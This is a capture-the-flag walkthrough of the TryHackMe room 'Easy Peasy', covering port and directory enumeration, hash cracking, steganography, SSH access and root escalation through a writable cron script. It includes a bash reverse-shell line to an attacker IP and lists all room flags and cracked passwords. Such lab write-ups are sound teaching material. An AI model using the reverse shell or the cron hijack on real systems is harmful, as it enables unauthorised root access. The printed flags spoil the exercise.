---
title: "Easy Peasy"
description: "A CTF machine focused on web enumeration, hash cracking, steganography, and cron job privilege escalation across multiple hidden services."
difficulty: "Easy"
tags: ["Web Enumeration", "Gobuster", "Steganography", "Hash Cracking", "Cron Job", "GOST"]
date: "2026-07-04"
---

## Overview

Easy Peasy is a TryHackMe room that tests enumeration skills through multiple layers of hidden web directories, encoded strings, hash cracking, steganography, and cron job abuse. The room uses a custom wordlist for hash cracking and requires attention to detail across three different services.

## Room Information

- **Platform:** TryHackMe
- **Difficulty:** Easy
- **Skills Learned:** Directory enumeration, Base encoding identification, Hash cracking (MD5, GOST), Steganography (steghide), Cron job privilege escalation

## Enumeration

### Nmap Scan

```bash
nmap -sV -sC -p- -T4 10.49.168.227
```

Three open ports were discovered:

| Port | Service | Version |
|------|---------|---------|
| 80/tcp | HTTP | nginx 1.16.1 |
| 6498/tcp | SSH | OpenSSH 7.6p1 Ubuntu |
| 65524/tcp | HTTP | Apache 2.4.43 (Ubuntu) |

![Nmap scan results](/assets/screenshots/easypeasy/nmap_scan.png)

The scan revealed two web servers on different ports and SSH running on a non-standard port. Both web servers had `robots.txt` files disallowing the root path.

### Port 80 — nginx Enumeration

The default nginx page offered little information. Ran Gobuster to discover hidden directories:

![Gobuster discovering /hidden directory](/assets/screenshots/easypeasy/gobuster.png)

```bash
gobuster dir -u http://10.49.168.227 -w /usr/share/wordlists/dirb/common.txt
```

This revealed a `/hidden` directory containing an image of a dark room.

![Hidden directory showing dark room image](/assets/screenshots/easypeasy/lost_places.jpg)

Further enumeration of that directory uncovered a subdirectory:

```bash
gobuster dir -u http://10.49.168.227/hidden/ -w /usr/share/wordlists/dirb/common.txt
```

![Hidden directory page](/assets/screenshots/easypeasy/hidden_dir.png)

Found `/hidden/whatever` containing a landscape image. The page source contained a hidden paragraph with a Base64-encoded string:

![Whatever directory](/assets/screenshots/easypeasy/whatever_dir.png)

![Hidden Base64 string in page source](/assets/screenshots/easypeasy/source_hidden.png)

```html
<p hidden>ZmxhZ3tmMXJzN19mbDRnfQ==</p>
```

Decoding it revealed the first flag:

```bash
echo "ZmxhZ3tmMXJzN19mbDRnfQ==" | base64 -d
```

![Flag 1 decoded in terminal](/assets/screenshots/easypeasy/flag1_decode.png)

**Flag 1:** `flag{f1rs7_fl4g}`

### Port 65524 — Apache Enumeration

The Apache server showed the default "It works" page. Ran another Gobuster scan:

```bash
gobuster dir -u http://10.49.168.227:65524 -w /usr/share/wordlists/dirb/common.txt
```

Found `robots.txt` with an unusual User-Agent field — a string that looked like an MD5 hash:

![Apache robots.txt with MD5 hash](/assets/screenshots/easypeasy/robots_txt.png)

```
User-Agent:*
Disallow:/
User-Agent:a18672860d0510e5ab6699730763b250
Allow:/
```

![MD5 hash cracked on md5hashing.net](/assets/screenshots/easypeasy/hash_crack.png)

This MD5 hash cracked via md5hashing.net to reveal flag 2.

**Flag 2:** `flag{1nj3ct10n_1s_4_k3y}`

The Apache page source also contained flag 3 in plain text:

```html
Fl4g 3: flag{9fdafbd64c47471a8f54cd3fc64cd312}
```

**Flag 3:** `flag{9fdafbd64c47471a8f54cd3fc64cd312}`

### Hidden Directory Discovery

The same Apache page source had another hidden paragraph hinting at encoding:

```html
<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>
```

The string `ObsJmP173N2X6dOrAgEAL0Vu` was Base62 encoded. Decoding it revealed a hidden directory path:

```
/n0th1ng3ls3m4tt3rs
```

Visiting this path displayed a matrix-themed page with a hash and an image.

![Matrix-themed page at /n0th1ng3ls3m4tt3rs](/assets/screenshots/easypeasy/matrix.png)

### Hash Cracking

The page source contained a SHA-256 looking hash:

```
940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81
```

Hash identifier suggested SHA-256 or Haval-256, but the actual algorithm was **GOST R 34.11-94**. Used John the Ripper with the custom `easypeasy.txt` wordlist (after removing duplicates):

```bash
sort -u easypeasy.txt > easypeasy.dict
john hash.txt --wordlist=easypeasy.dict --format=GOST
```

![John cracking the GOST hash](/assets/screenshots/easypeasy/hashcat_gost.png)

The hash cracked to reveal a password: `mypasswordforthatjob`

### Steganography

The same page had a binary-themed image (`binarycodepixabay.jpg`). Used `steghide` with the cracked password to extract hidden data:

![Binary code image used for steganography](/assets/screenshots/easypeasy/binarycodepixabay.jpg)

```bash
steghide extract -sf binarycodepixabay.jpg
# Passphrase: mypasswordforthatjob
```

This extracted `secrettext.txt` containing credentials:

```
username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
```

Converting the binary to ASCII gave the SSH password: `iconvertedmypasswordtobinary`

## Initial Access — SSH

Connected via SSH on the non-standard port:

```bash
ssh boring@10.49.168.227 -p 6498
```

![SSH login as boring](/assets/screenshots/easypeasy/ssh_login.png)

### User Flag

The user flag in `user.txt` was ROT13 encoded:

```
synt{63q9n4p8176798n19r334p1qsp094or9}
```

Applied ROT13 to decode:

**User flag:** `flag{63d9a4c8176798a19e334c1dfc094be9}`

## Privilege Escalation

Checked sudo permissions — none available. Checked `/etc/crontab` and found a cron job running every minute:

![Crontab showing root-executed cron job](/assets/screenshots/easypeasy/crontab.png)

```
* * * * * root cd /var/www/ && sudo bash .mysecretcronjob.sh
```

The script `/var/www/.mysecretcronjob.sh` was owned by the user `boring` and writable. Since root executes it every minute, we could inject a reverse shell.

Added a reverse shell payload to the script:

```bash
bash -i >& /dev/tcp/10.8.95.227/4444 0>&1
```

Started a netcat listener:

```bash
nc -lvnp 4444
```

Within 60 seconds, the cron job executed the script and we received a root shell.

![Reverse shell as root](/assets/screenshots/easypeasy/reverse_shell.png)

### Root Flag

The root flag was stored in a hidden file:

```bash
cat /root/.root.txt
```

![Root flag obtained](/assets/screenshots/easypeasy/root_flag.png)

**Root flag:** `flag{e14c320b01be4a8c567ad7dba45fa323}`

## Flags

| Flag | Value |
|------|-------|
| Flag 1 (Base64) | `flag{f1rs7_fl4g}` |
| Flag 2 (MD5) | `flag{1nj3ct10n_1s_4_k3y}` |
| Flag 3 (Plaintext) | `flag{9fdafbd64c47471a8f54cd3fc64cd312}` |
| User (ROT13) | `flag{63d9a4c8176798a19e334c1dfc094be9}` |
| Root | `flag{e14c320b01be4a8c567ad7dba45fa323}` |

## Commands Used

```bash
nmap -sV -sC -p- -T4 <target-ip>
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://<target-ip>:65524 -w /usr/share/wordlists/dirb/common.txt
sort -u easypeasy.txt > easypeasy.dict
john hash.txt --wordlist=easypeasy.dict --format=GOST
steghide extract -sf binarycodepixabay.jpg
ssh boring@<target-ip> -p 6498
nc -lvnp 4444
```

## Lessons Learned

- **Enumerate every port** — The initial top-1000 port scan only showed port 80. A full port scan (`-p-`) revealed SSH on 6498 and Apache on 65524, both critical for the attack path.
- **Identify encoding formats** — Base64, Base62, and binary encoding were all used. The trailing `==` and character set (only A-Z, a-z, 0-9 for Base62) are key identifiers.
- **Hash algorithm matters** — The GOST hash looked like SHA-256 but required `--format=GOST` in John. Hash identifier tools suggest possibilities, but you may need to try multiple formats.
- **Always check robots.txt** — Both web servers had robots.txt files. The Apache one contained an MD5 hash that was the second flag.
- **Cron jobs owned by non-root users** — The root-executed cron script was writable by `boring`, enabling privilege escalation. Always check file ownership on scripts referenced in crontab.
- **Steganography with custom wordlists** — The `steghide` passphrase was found by cracking a hash with the room's custom wordlist, then using that password to extract hidden data from an image.

## References

- [TryHackMe — Easy Peasy](https://tryhackme.com/room/easypeasyctf)
- [CyberChef](https://gchq.github.io/CyberChef/)
- [md5hashing.net](https://md5hashing.net/)
- [Steghide](http://steghide.sourceforge.net/)
- [GTFOBins](https://gtfobins.github.io/)
- [PentestMonkey Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
